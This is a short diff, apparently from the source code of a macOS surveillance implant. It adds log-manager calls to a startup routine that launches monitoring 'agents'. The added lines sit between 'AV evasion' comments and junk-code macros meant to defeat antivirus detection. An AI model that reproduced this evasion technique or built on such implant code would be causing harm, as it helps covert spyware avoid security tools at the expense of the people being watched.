@@ -4449,6 +4449,16 @@ static void computerWillShutdown(CFMachPortRef port,
   // AV evasion: only on release build
   AV_GARBAGE_000
   
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  [logManager updateLogQueue];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   // Load configuration, starts all agents and the events monitoring routine
